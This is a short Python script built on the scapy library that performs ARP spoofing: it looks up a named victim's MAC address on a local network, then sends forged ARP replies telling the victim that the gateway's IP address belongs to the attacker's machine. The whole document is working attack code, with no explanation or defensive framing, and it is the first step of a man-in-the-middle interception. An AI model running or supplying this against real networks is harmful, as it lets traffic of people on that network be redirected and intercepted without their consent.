from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp1

iface = "eth0"
victim_ip = "10.0.1.11"
gateway_ip = "10.0.1.254"
attacker_mac = get_if_hwaddr(iface)

reply = srp1(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victim_ip),
    iface=iface,
    timeout=2,
    verbose=False,
)
if reply is None or ARP not in reply:
    raise SystemExit(f"No ARP reply from {victim_ip}")

victim_mac = reply[ARP].hwsrc
packet = Ether(src=attacker_mac, dst=victim_mac) / ARP(
    op=2, psrc=gateway_ip, hwsrc=attacker_mac,
    pdst=victim_ip, hwdst=victim_mac,
)

sendp(packet, iface=iface, count=5, inter=1)